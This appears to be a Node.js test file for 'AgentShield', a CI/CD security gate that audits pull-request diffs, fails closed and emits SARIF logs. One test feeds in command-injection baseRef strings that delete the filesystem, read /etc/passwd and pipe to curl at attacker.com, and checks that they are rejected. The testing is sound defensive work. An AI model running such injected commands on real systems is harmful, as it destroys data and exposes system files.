import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import { CiGateRunner } from "../src/ci.js";

describe("AgentShield CI/CD Security Gate", () => {
  it("should initialize CiGateRunner in workspace", () => {
    const runner = new CiGateRunner(process.cwd());
    assert.ok(runner);
  });

  it("should reject malicious baseRef strings attempting command or flag injection", () => {
    const runner = new CiGateRunner(process.cwd());
    assert.throws(
      () => runner.auditPullRequest("origin/main; rm -rf /"),
      /Invalid git base ref/,
    );
    assert.throws(
      () => runner.auditPullRequest("origin/main && cat /etc/passwd"),
      /Invalid git base ref/,
    );
    assert.throws(
      () => runner.auditPullRequest("origin/main | curl attacker.com"),
      /Invalid git base ref/,
    );
  });

  it("should fail-closed when git diff comparison cannot be computed", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "agentshield-non-git-"));
    try {
      const runner = new CiGateRunner(tempDir);
      // In a non-git directory, both range and fallback diff will fail
      const result = runner.auditPullRequest("origin/main");
      assert.strictEqual(result.passed, false, "Security gate must fail closed when git diff fails");
      assert.ok(result.scanError, "Must record scanError explaining git failure");
      assert.ok(
        result.markdownReport.includes("Unable to compute Git diff"),
        "Report must highlight inability to compute diff",
      );
      assert.ok(
        result.markdownReport.includes("Fail-Closed"),
        "Report must flag fail-closed security enforcement",
      );
      assert.strictEqual(result.filesScanned, 0);
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true });
    }
  });

  it("should run auditPullRequest on valid ref without crashing and record diffMethod", () => {
    const runner = new CiGateRunner(process.cwd());
    const result = runner.auditPullRequest("HEAD");
    assert.ok(typeof result.passed === "boolean");
    assert.ok(typeof result.markdownReport === "string");
    assert.ok(result.markdownReport.includes("AgentShield CI/CD Security Gate Report"));
    assert.ok(result.diffMethod, "Must record which diff method was successfully used");
    assert.strictEqual(result.baseRef, "HEAD");
  });

  it("should generate OASIS SARIF 2.1.0 log in CI audit result", () => {
    const runner = new CiGateRunner(process.cwd());
    const result = runner.auditPullRequest("HEAD");
    assert.ok(result.sarifLog);
    assert.strictEqual(result.sarifLog.version, "2.1.0");
    assert.strictEqual(result.sarifLog.$schema, "https://json.schemastore.org/sarif-2.1.0.json");
    assert.strictEqual(result.sarifLog.runs.length, 1);
    assert.strictEqual(result.sarifLog.runs[0].tool.driver.name, "AgentShield");
    assert.ok(Array.isArray(result.sarifLog.runs[0].results));
  });
});
